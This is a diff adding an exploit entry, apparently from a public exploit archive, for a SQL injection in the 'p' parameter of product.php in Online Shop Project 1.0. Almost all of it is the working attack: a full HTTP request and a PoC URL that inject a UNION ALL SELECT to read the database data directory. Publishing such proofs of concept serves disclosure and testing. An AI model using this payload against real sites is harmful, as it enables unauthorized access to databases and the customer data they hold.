@@ -1,0 +1,27 @@
+# Exploit Title: Online Shop Project 1.0 - 'p' SQL Injection
+# Date: 2020-09-20
+# Exploit Author: Augkim
+# Vendor Homepage: https://www.sourcecodester.com/php/14448/online-shop-project-using-phpmysql.html
+# Software Link: https://www.sourcecodester.com/sites/default/files/download/oretnom23/online-shop-using-php.zip
+# Tested on: Apache2
+
+
+GET
+/shop/product.php?p=2%20UNION%20ALL%20SELECT%201,2,3,4,@@datadir,6,7,8--%20-
+HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0)
+Gecko/20100101 Firefox/80.0
+Accept:
+text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: ko-KR,ko;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Connection: close
+Cookie: PHPSESSID=lmuj4akmh6q1flmcbnuisgttom
+Upgrade-Insecure-Requests: 1
+Cache-Control: max-age=0
+Origin: foo.example.org
+
+
+PoC:
+/URL/product.php?p=2%20UNION%20ALL%20SELECT%201,2,3,4,@@datadir,6,7,8--%20-
